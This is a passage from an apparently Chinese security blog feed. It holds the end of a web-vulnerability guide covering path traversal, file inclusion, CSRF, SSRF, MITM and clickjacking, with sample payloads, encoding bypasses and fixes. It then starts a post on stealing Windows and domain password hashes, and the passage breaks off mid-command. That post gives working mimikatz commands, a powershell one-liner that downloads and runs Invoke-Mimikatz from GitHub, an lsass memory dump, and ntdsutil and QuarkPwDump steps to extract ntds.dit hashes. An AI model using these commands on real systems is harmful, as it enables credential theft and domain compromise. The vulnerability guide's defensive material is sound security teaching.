variable">$fh</span><span class="token operator">></span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span><span class="token keyword">print</span> <span class="token string">"&lt;li>$_&lt;/li>\n"</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token keyword">print</span> <span class="token string">"&lt;/ul>\n"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​    攻击者可以构造以下<code>payload</code>进行攻击，打开文件后，操作系统会在路径规范化期间解析“<code>../</code>”，并真实访问此文件：“<code>/etc/passwd</code>”，攻击者可以读取密码文件的内容。</p><pre class="line-numbers language-bash"><code class="language-bash"> /users/root/profiles/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>检测方法</strong></p><ul><li><p>攻击者通过访问根目录，发送一系列“<code>../</code>”字符来遍历高层目录，可以执行系统命令，甚至使系统崩溃，并且尝试找到系统的配置文件或者系统中存在的敏感文件。</p></li><li><p>也可通过判断网站语言，并根据其<code>url</code>中部分提供的参数，进行构造相关的路径信息，如收集到网站中间件版本为<code>apache</code>，则想办法构造<code>../../../Web-INF/Web.xml</code>等，然后查看其是否可被下载出来。随后可构造下载系统文件。</p></li><li><p>编码或者多重编码绕过：</p><pre><code>编码或多重编码   |   明码内容 %2e%2e%2f       |   ../   %2e%2e/         |   ../   ..%2f           |   ../  %2e%2e%5c       |   ..\   %2e%2e\         |   ..\   ..%5c           |   ..\  %252e%252e%255c |   ..\  ..%255c         |   ..\   ..%c0%af        |   ../   ..%c1%9c        |   ..\   </code></pre></li></ul><p><strong>修复建议</strong></p><ul><li><p>防止文件路径遍历漏洞的最有效方法是避免将用户提供的输入完全传递给文件系统<code>API</code>。</p></li><li><p>需对用户提交的内容进行严格的过滤，主要指过滤目录跳转符“<code>../</code>”，字符截断符，<code>dir</code>命令等。</p></li><li><p>严格控制<code>Web</code>根目录的权限。</p></li></ul><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p><strong>漏洞描述</strong></p><ul><li>文件包含是指程序代码在处理包含文件的时候没有严格控制。主要包括本地文件包含和远程文件包含两种形式，由于开发人员编写源码，开放着将可重复使用的代码插入到单个的文件中，并在需要的时候将它们包含在特殊的功能代码文件中，然后包含文件中的代码会被解释执行。由于并没有针对代码中存在文件包含的函数入口做过滤，导致客户端可以提交恶意构造语句提交，并交由服务器端解释执行。文件包含攻击中<code>Web</code>服务器源码里可能存在<code>inlcude()</code>此类文件包含操作函数，可以通过客户端构造提交文件路径，是该漏洞攻击成功的最主要原因。</li></ul><p><strong>漏洞危害</strong></p><ul><li><p>文件包含漏洞会导致用户可以构造参数包含远程代码在服务器上执行，并得到网站配置或者敏感文件，进而获取到服务器权限，造成网站被恶意删除，用户和交易数据被篡改等一系列恶性后果。</p></li><li><p>即使没有上载和执行代码的能力，本地文件包含漏洞也可能很危险。攻击者仍然可以使用<code>LFI</code>漏洞执行目录遍历/路径遍历攻击。</p></li></ul><p><strong>攻击案例</strong></p><p>场景1：以下是<code>php</code>存在文件包含的问题代码，通过使用提供的’<code>module_name</code>‘参数并将字符串’<code>/function.php</code>‘附加到’<code>module_name</code>‘之后，可以构建文件的路径。通过对 ‘<code>module_name</code>’参数进行构造’<code>?module_name=abc/function.php</code>’，如果’<code>function.php</code>’内容是’ <code>system($_GET[&#39;cmd&#39;]);</code>’，则攻击者可以构造恶意<code>payload </code> ‘ <code>?module_name=abc&amp;cmd=/etc/passwd</code>’，来读取目标服务器的敏感文件。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'module_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$dir</span> <span class="token punctuation">.</span> <span class="token string">"/function.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>检测方法</strong></p><ul><li><p>通过代码审计的方式检查代码里出现include或require的代码段；</p></li><li><p>典型的概念验证是加载passwd文件：</p><pre class="line-numbers language-http"><code class="language-http"><span class="token header-name keyword">http:</span>//vulnerable_host/preview.php?file=../../../../etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果成功执行则会回显以下内容：</p><pre><code>root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinalex:x:500:500:alex:/home/alex:/bin/bashmargo:x:501:501::/home/margo:/bin/bash...</code></pre></li></ul><p><strong>修复建议</strong></p><ul><li><p>为避免本地文件包含（<code>LFI</code>）和远程文件包含（<code>RFI</code>），保证用户输入不可信。如果需要在网站或Web应用程序代码中包含本地文件，请使用允许的文件名和位置的白名单。使用文件上传功能，确保攻击者无法替换这些文件。</p></li><li><p>需对用户提交的内容进行严格的过滤，主要指过滤目录跳转符“<code>../</code>”，字符截断符，<code>dir</code>命令等。</p></li><li><p>严格控制<code>Web</code>根目录的权限。</p></li></ul><h3 id="跨站请求伪造（CSRF）"><a href="#跨站请求伪造（CSRF）" class="headerlink" title="跨站请求伪造（CSRF）"></a>跨站请求伪造（CSRF）</h3><p><strong>漏洞描述</strong></p><ul><li><code>CSRF</code>（<code>Cross-site request forgery</code>）跨站请求伪造：攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。</li></ul><p><strong>漏洞危害</strong></p><ul><li><p>获得特权或承担身份；绕过保护机制；读取应用数据；修改申请数据；DoS攻击：使目标崩溃，退出或重新启动。</p></li><li><p>攻击者可以成功地执行任何操作，决定于受害者的权限。如果受害者是管理员或特权用户，则后果可能包括获得对Web应用程序的完全控制-删除或窃取数据，卸载产品或使用它对产品的所有者发起其他攻击。由于攻击者获取了受害者的权限，因此CSRF的影响范围仅受受害者的特权限制。</p></li></ul><p><strong>攻击案例</strong></p><p>场景1：</p><p>​    受害者登录<code>a.com</code>，并保留了登录凭证（<code>Cookie</code>）。</p><p>​    攻击者引诱受害者访问了<code>b.com</code>。</p><p>​    <code>b.com</code>向 <code>a.com</code> 发送了一个请求：<code>a.com/act=xx</code>。浏览器会默认携带<code>a.com</code>的<code>Cookie</code>。</p><p>​    <code>a.com</code>接收到请求后，对请求进行验证，并确认是受害者的凭证，误以为是受害者自己发送的请求。</p><p>​    <code>a.com</code>以受害者的名义执行了<code>act=xx</code>。</p><p>​    攻击完成，攻击者在受害者不知情的情况下，冒充受害者，让<code>a.com</code>执行了自己定义的操作。</p><p><strong>检测方法</strong></p><ul><li><p>攻击者有理由诱使应用程序中发生某种动作。这可能是特权操作（例如，修改其他用户的权限）或对用户特定数据的任何操作（例如，更改用户自己的密码）。</p></li><li><p>执行该操作涉及发出一个或多个<code>HTTP</code>请求，并且该应用程序仅依靠会话<code>cookie</code>来标识发出请求的用户。没有其他机制可以跟踪会话或验证用户请求。</p></li><li><p>执行该操作的请求不包含攻击者无法确定或猜测其值的任何参数。例如，当使用户更改密码时，如果攻击者需要知道现有密码的值，则该功能不会受到影响。</p></li><li><p>例如，假设一个应用程序包含一个功能，该功能使用户可以更改其帐户上的电子邮件地址。用户执行此操作时，将发出如下<code>HTTP</code>请求：</p><pre class="line-numbers language-http"><code class="language-http">POST /email/change HTTP/1.1<span class="token header-name keyword">Host:</span> vulnerable-website.com<span class="token header-name keyword">Content-Type:</span> application/x-www-form-urlencoded<span class="token header-name keyword">Content-Length:</span> 30<span class="token header-name keyword">Cookie:</span> session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfEemail=wiener@normal-user.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>在满足<code>CSRF</code>攻击条件的情况下，攻击者可以构建包含以下HTML的网页：</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://vulnerable-website.com/email/change<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>pwned@evil-user.net<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">      document<span class="token punctuation">.</span>forms<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>如果受害用户访问攻击者的网页，则会发生以下情况：</p></li><li><p>攻击者的页面将触发对易受攻击的网站的HTTP请求。  如果用户登录到易受攻击的网站，则其浏览器将自动在请求中包括其会话<code>cookie</code>（假设未使用<code>SameSite cookie</code>）。  易受攻击的网站将以正常方式处理请求，将其视为受害用户提出，并更改其电子邮件地址。  </p></li></ul><p><strong>修复建议</strong></p><ul><li><p><code>CSRF</code>自动防御策略：同源检测（<code>Origin</code>和 <code>Referer</code>验证）。</p></li><li><p>利用<code>SameSite Cookie</code>属性。</p></li><li><p><code>CSRF</code>主动防御措施：<code>Token</code>验证或者双重<code>Cookie</code>验证以及配合<code>Samesite Cookie</code>。</p></li><li><p>保证页面的幂等性，后端接口不要在<code>GET</code>页面中做用户操作。</p></li><li><p>基于用户交互的<code>CSRF</code>防御：重新认证（密码）、一次性令牌、验证码。</p></li></ul><h3 id="服务器端伪造请求（SSRF）"><a href="#服务器端伪造请求（SSRF）" class="headerlink" title="服务器端伪造请求（SSRF）"></a>服务器端伪造请求（SSRF）</h3><p><strong>漏洞描述</strong></p><ul><li><code>SSRF</code>（<code>Server-Side Request Forgery</code>，服务端请求伪造）是一种由攻击者构造请求，由服务端发起的请求的安全漏洞。一般情况下，<code>SSRF</code>攻击的目标是外网无法访问的内部系统。</li></ul><p><strong>漏洞危害</strong></p><ul><li><p>成功利用<code>SSRF</code>攻击通常会导致易受攻击的应用程序本身或应用程序可以与之通信的其他后端系统上未经授权的操作或对组织内数据的访问。在某些情况下，<code>SSRF</code>漏洞可能允许攻击者执行任意命令执行。</p></li><li><p>导致与外部第三方系统建立连接的<code>SSRF</code>利用可能导致恶意的继续攻击。</p></li></ul><p><strong>攻击案例</strong></p><p><strong>检测方法</strong></p><p><strong>修复建议</strong></p><ul><li><p>禁止跳转。</p></li><li><p>过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果<code>Web</code>应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p></li><li><p>禁用不需要的协议，仅仅允许<code>http</code>和<code>https</code>请求。可以防止类似于<code>file://</code>, <code>gopher://</code>, <code>ftp://</code> 等引起的问题</p></li><li><p>设置<code>URL</code>白名单或者限制内网<code>IP</code>（使用<code>gethostbyname()</code>判断是否为内网<code>IP</code>）</p></li><li><p>限制请求的端口为<code>http</code>常用的端口，比如 <code>80</code>、<code>443</code>、<code>8080</code>、<code>8090</code></p></li><li><p>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p></li><li><p>黑名单过滤器：</p><p>阻止包含主机名（如<code>127.0.0.1</code>和<code>localhost</code>）。</p><p>阻止内网地址的访问（如<code>192.168.x.x/10.x.x.x</code>等）。</p><p>使用<code>URL</code>编码或大小写变化对阻塞的字符串进行混淆。</p></li><li><p>白名单过滤器：</p><p>使用@字符在主机名之前的<code>URL</code>中嵌入凭据。例如：<code>https://expected-host@evil-host</code>。</p><p>使用该<code>#</code>字符来指示<code>URL</code>片段。例如：<code>https://evil-host#expected-host</code>。</p><p>利用DNS命名层次结构将所需的输入放入您控制的标准<code>DNS</code>名称中。例如：<code>https://expected-host.evil-host</code>。</p><p>使用<code>URL</code>编码字符来混淆<code>URL</code>解析代码。如果实现过滤器的代码与执行后端<code>HTTP</code>请求的代码以不同的方式处理<code>URL</code>编码的字符，则这特别有用。</p></li></ul><h3 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h3><p><strong>漏洞描述</strong></p><ul><li><p>中间人攻击（<code>Man-in-the-Middle Attack</code>, <code>MITM</code>）是一种由来已久的网络入侵手段，并且当今仍然有着广泛的发展空间，如<code>SMB</code>会话劫持、<code>DNS</code>欺骗等攻击都是典型的<code>MITM</code>攻击。简而言之，所谓的<code>MITM</code>攻击就是通过拦截正常的网络通信数据，并进行数据篡改和嗅探，而通信的双方却毫不知情。当黑客将自己插入客户端和服务器的通信之间时，就会发生<code>MitM</code>攻击。</p></li><li><p>中间人攻击常见类别：<code>IP</code>欺骗、<code>DNS</code>欺骗、<code>ARP</code>欺骗、<code>HTTPS</code>欺骗、<code>SSL</code>劫持、<code>DNS</code>劫持、电子邮件劫持、<code>WIFI</code>窃听、窃取浏览器<code>Cookie</code>、<code>SSL</code>剥离。</p></li></ul><p><strong>漏洞危害</strong></p><ul><li><p>一旦攻击者找到了易受攻击的路由器，他们便可以部署工具来拦截和读取受害者的传输数据。然后，攻击者还可以将其工具插入受害者的计算机和用户访问的网站之间，以捕获登录凭据，银行信息和其他个人信息。</p></li><li><p>成功利用中间人攻击的攻击者可以窃取用户的敏感信息、挂马等。</p></li></ul><p><strong>攻击案例</strong></p><p>场景1：会话劫持：</p><p>在这种<code>MitM</code>攻击中，攻击者劫持了受信任的客户端和网络服务器之间的会话。当服务器继续会话时，攻击计算机将其<code>IP</code>地址替换为受信任的客户端，认为它正在与客户端进行通信。例如，攻击可能会像这样展开：</p><p>1.客户端连接到服务器。</p><p>2.攻击者的计算机控制了客户端。</p><p>3.攻击者的计算机将客户端与服务器断开连接。</p><p>4.攻击者的计算机用其自己的<code>IP</code>地址替换客户端的<code>IP</code>地址，并欺骗客户端的序列号。</p><p>5.攻击者的计算机继续与服务器对话，并且服务器认为服务器仍在与客户端通信。</p><p><strong>检测方法</strong></p><ul><li><p>中间人攻击常见攻击工具：</p><p><code>dsniff</code> —— 一个实现<code>SSH</code>和<code>SSL</code>中间人攻击的工具</p><p><code>Cain and Abel</code> ——  <code>Windows</code>图形界面的工具，它可以执行中间人攻击，嗅探和<code>ARP</code>投毒</p><p><code>Ettercap</code> ——  一个基于局域网的中间人攻击工具</p><p><code>Karma</code> —— 一个使用<code>802.11 Evil Twin</code>以执行<code>MITM</code>攻击的工具</p><p><code>AirJack</code> —— 一个演示<code>802.11 MITM</code>攻击的工具</p><p><code>SSLStrip</code>—— 一个基于<code>SSL</code>的<code>MITM</code>攻击的工具</p><p><code>SSLSniff</code>—— 一个基于<code>SSL</code>的<code>MITM</code>攻击的工具。原本是利用一个在<code>Internet Explorer</code>上缺陷实现的。</p><p><code>csploit</code> —— 一个在<code>android</code>系统上实现的<code>MITM</code>攻击工具包。</p><p><code>Mallory</code> ——  一个透明的<code>TCP</code>和<code>UDP MiTMing</code>代理。扩展到<code>MITM SSL</code>，<code>SSH</code>和许多其他协议。</p><p><code>wsniff</code> ——  一个<code>802.11 HTTP/HTTPS</code>的基于<code>MITM</code>攻击的工具</p></li></ul><p><strong>修复建议</strong></p><ul><li><p>接入更安全的加密协议<code>WEP/WAP</code>的无线网络</p><p>无线访问点具有强大的加密机制，可以防止有害用户仅在附近就可以加入您的网络。弱的加密机制可以使攻击者以暴力方式进入网络并开始中间人攻击。加密实施越强，就越安全。</p></li><li><p>设置更安全的路由器登录凭证 </p><p>确保更改默认路由器登录名。不仅是<code>Wi-Fi</code>密码，还有路由器管理界面的登录凭据。如果攻击者找到了路由器登录凭据，则他们可以将<code>DNS</code>服务器更改为恶意服务器。甚至使用恶意软件感染路由器。</p></li><li><p>使用虚拟专用网</p><p><code>VPN</code>可用于为局域网内的敏感信息创建安全的环境。他们使用基于密钥的加密来创建用于安全通信的子网。这样，即使攻击者碰巧进入共享的网络，他也将无法破译<code>VPN</code>中的流量。</p></li><li><p>强制使用<code>HTTPS</code></p><p><code>HTTPS</code>可用于使用公私密钥交换通过<code>HTTP</code>安全地进行通信。这样可以防止攻击者利用它正在嗅探的数据。网站应仅使用<code>HTTPS</code>，而不应提供<code>HTTP</code>替代方法。用户可以安装浏览器插件以始终对请求使用<code>HTTPS</code>来强制实施。</p></li><li><p>基于公钥对的身份验证</p><p>中间人攻击通常涉及欺骗某物或另一物。可以在堆栈的各个层中使用基于公共密钥对的身份验证（例如<code>RSA</code>），以帮助确保正在与之通信的对象是否确实是要与之通信的对象。</p></li></ul><h3 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a>点击劫持</h3><p><strong>漏洞描述</strong></p><ul><li>点击劫持（<code>Click Jacking</code>）是一种视觉上的欺骗手段，攻击者通过使用一个透明的<code>iframe</code>，覆盖在一个网页上，然后诱使用户在该页面上进行操作，通过调整<code>iframe</code>页面的位置，可以使得伪造的页面恰好和<code>iframe</code>里受害页面里一些功能重合（按钮），以达到窃取用户信息或者劫持用户操作的目的。</li></ul><p><strong>漏洞危害</strong></p><ul><li>成功利用此漏洞攻击者可以窃取用户敏感信息。</li></ul><p><strong>攻击案例</strong></p><p>场景1：从<code>Google Chrome 4.0</code>和<code>IE8</code>开始，引入了<code>XSS</code>过滤器，以保护用户免受反射的<code>XSS</code>攻击。<code>Nava</code>和<code>Lindsay</code>已经观察到，这类过滤器可以伪装成恶意代码，从而用于停用帧无效代码。</p><p>示例：目标网页框架无效代码：</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token keyword">if</span> <span class="token punctuation">(</span> top <span class="token operator">!=</span> self <span class="token punctuation">)</span>    <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        top<span class="token punctuation">.</span>location<span class="token operator">=</span>self<span class="token punctuation">.</span>location<span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>攻击者代码：</p><pre class="line-numbers language-html"><code class="language-html">&lt;iframe src=”http://target.com/?param=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span>if”><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>检测方法</strong></p><ul><li><p>测试人员可以通过创建一个简单的网页（包括包含目标网页的框架）来测试目标网页是否可以加载到嵌入式框架中。以下代码段显示了用于创建此测试网页的<code>HTML</code>代码示例：</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Clickjack test page<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.target.site<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>500<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>500<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>如果将<code>http://www.target.site</code>页面成功加载到框架中，则该站点容易受到攻击，并且没有针对点击劫持攻击的保护措施。</p></li><li><p><code>OWASP</code>检测方法：</p><p><code>https://owasp.org/www-project-Web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking.html</code></p></li></ul><p><strong>修复建议</strong></p><ul><li><p>可以使用三种主要机制来防御这些攻击：</p><p>禁止浏览器使用<code>X-Frame-Options</code>或内容安全策略(<code>frame-ancestors</code>) <code>HTTP</code>标头在框架中加载页面。</p><p>使用<code>SameSite cookie</code>属性将页面加载到框架中时，防止包含会话<code>cookie</code> 。</p><p>在页面中实现<code>JavaScript</code>代码以尝试防止将其加载到框架中。</p></li><li><p>基于内容安全策略（<code>CSP</code>）防止点击劫持，以下<code>CSP</code>仅将框架列入白名单：</p><p>为了防止内容的所有框架使用：</p><p>  <code>Content-Security-Policy: frame-ancestors  &#39;none&#39;;  </code></p><p>要允许网站本身使用，请使用：</p><p>  <code>Content-Security-Policy: frame-ancestors  &#39;self&#39;;  </code></p><p>要允许信任域，请执行以下操作：</p><p>  <code>Content-Security-Policy: frame-ancestors  trusted.com;  </code></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>抓取 Windows 用户或者域用户 hash 的多种姿势</title>
      <link href="/2021/06/08/zhua-hash.htm"/>
      <url>/2021/06/08/zhua-hash.htm</url>
      
        <content type="html"><![CDATA[<h2 id="抓取-Windows-用户或者域用户-hash-的多种姿势"><a href="#抓取-Windows-用户或者域用户-hash-的多种姿势" class="headerlink" title="抓取 Windows 用户或者域用户 hash 的多种姿势"></a>抓取 Windows 用户或者域用户 hash 的多种姿势</h2><blockquote><p>Ntds.dit是主要的AD数据库，包括有关域用户，组和组成员身份的信息。它还包括域中所有用户的密码哈希值。为了进一步保护密码哈希值，使用存储在SYSTEM注册表配置单元中的密钥对这些哈希值进行加密。第二个加密步骤是为了执行密码转储以进行审计，需要两个文件的副本。<span id="more"></span></p><p>执行密码安全审核所需的主要步骤是获取包含信息的文件，从文件中转储密码哈希值，然后使用密码破解程序测试弱密码的这些哈希值。</p><p>通过获取Ntds.dit和SYSTEM文件的副本，最可靠的执行密码审计的方法是脱机的。由于Windows阻止这些操作阻止标准读取或复制，因此必须使用特殊技术来获取副本。</p></blockquote><ul><li><p>使用mimikatz本机测试直接获取内存中的明文密码</p></li><li><p>mimikatz 只能抓取登陆过的用户hash，无法抓取所有用户,需要免杀</p><pre class="line-numbers language-shell"><code class="language-shell">privilege::debugsekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul><ul><li><p>非交互式抓明文密码(webshell中)</p><pre class="line-numbers language-shell"><code class="language-shell">mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" > password.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>powershell加载mimikatz抓取密码</p><pre class="line-numbers language-shell"><code class="language-shell">powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><ul><li>ProcDump + Mimikatz</li></ul><p>==ps:mimikatz的平台（platform）要与进行dump的系统(source dump)兼容(比如目标08的,本地就要用08系统来分析)==</p><p>远程主机：</p><pre><code>Procdump.exe -accepteula -ma lsass.exe c:\a.dmp    或者任务管理器找到lsass.exe进程右键创建转储文件</code></pre><p>本地主机：mimikatz</p><pre class="line-numbers language-cmd"><code class="language-cmd">sekurlsa::minidump a.dmpsekurlsa::logonpasswords full<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>ntds.dit 的导出</li></ul><p>ntdsutil win2008开始DC中自带的工具<br>交互式</p><pre class="line-numbers language-shell"><code class="language-shell">ntdsutilsnapshotactivate instance ntdscreatemount [GUID]//copy 完之后再执行unmout  [GUID]del [GUID]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>非交互</p><pre class="line-numbers language-shell"><code class="language-shell">ntdsutil snapshot "activate instance ntds" create quit quitntdsutil snapshot "mount &#123;GUID&#125;" quit quitcopy MOUNT_POINT\windows\ntds\ntds.dit c:\temp\ntds.ditntdsutil snapshot "unmount &#123;GUID&#125;" "delete &#123;GUID&#125;" quit quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>QuarkPwDump分析 <a href="https://github.com/quarkslab/quarkspwdump">https://github.com/quarkslab/quarkspwdump</a></li></ul><p>在线提取（直接在目标主机执行，实战中不选择此方式。）</p><pre class="line-numbers language-c"><code class="language-c">QuarkPwDump<span class="token punctuation">.</span>exe <span class="token operator">--</span>dump<span class="token operator">-</span>hash<span class="token operator">-</span>domain <span class="token operator">--</span>with<span class="token operator">-</span>history <span class="token operator">--</span>ntds<span class="token operator">-</span>file c<span class="token punctuation">:</span>\ntds<span class="token punctuation">.</span>dit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>离线提取 需要两个文件 ntds.dit 和 system.hive ， 其中system.hive可通过reg save hklm\system system.hive获取</p><pre class="line-numbers language-c"><code class="language-c">QuarkPwDump<span class="token punctuation">.</span>exe <span class="token operator">--</span>dump<span class="token operator">-</span>hash<span class="token operator">-</span>domain <span class="token operator">--</span>with<span class="token operator">-</span>history <span class="token operator">--</span>ntds<span class="token operator">-</span>file c<span class="token punctuation">:</span>\ntds<span class="token punctuation">.</span>dit <span class="token operator">--</span>system<span class="token operator">-</span>file c<span class="token punctuation">:</span>\system<span class="token punctuation">.</span>hive <span class="token operator">></span>c<span class="token punctuation">:</span>\hash<span class="token punctuation">.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>WINDOWS SERVER 2008-2016<pre class="line-numbers language-shell"><code class="language-shell">C:\> ntdsutilntdsutil: activate instance ntdsntdsutil: ifmifm: create full c:\auditifm: quitntdsutil: quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>解出ntds的hash</p><pre><code>NtdsAudit.exe &quot;ntds.dit&quot; -s &quot;SYSTEM&quot; -p pwdump.txt --users-csv users.csv</code></pre><p>  NtdsAudit.exe<a href="https://github.com/Dionach/NtdsAudit/releases/download/v2.0.5/NtdsAudit.exe">下载地址</a></p><p>NtdsAudit需要<code>ntds.dit</code> Active Directory数据库，<code>SYSTEM</code> 如果转储密码哈希，则需要注册表配置单元。这些文件由域控制器锁定，因此无法简单地复制和粘贴。从域控制器获取这些文件的推荐方法是使用内置<code>ntdsutil</code>实用程序。</p><ul><li><p>以管理员身份打开命令提示符（<code>cmd.exe</code>）。要以管理员身份打开命令提示符，请单击“启动”。在“开始搜索”中，键入命令提示符。在“开始”菜单的顶部，右键单击“命令提示符”，然后单击“以管理员身份运行”。如果出现“用户帐户控制”对话框，请输入相应的凭据（如果已请求）并确认其显示的操作是您所需的操作，然后单击“继续”。</p></li><li><p>在命令提示符下，键入以下命令，然后按ENTER键：</p></li></ul><pre><code>ntdsutil</code></pre><ul><li>在ntdsutil提示符下，键入以下命令，然后按Enter：</li></ul><pre><code>activate instance ntds</code></pre><ul><li>在ntdsutil提示符下，键入以下命令，然后按Enter：</li></ul><pre><code>ifm</code></pre><ul><li>在ifm提示符下，键入以下命令，然后按Enter：</li></ul><pre><code>create full 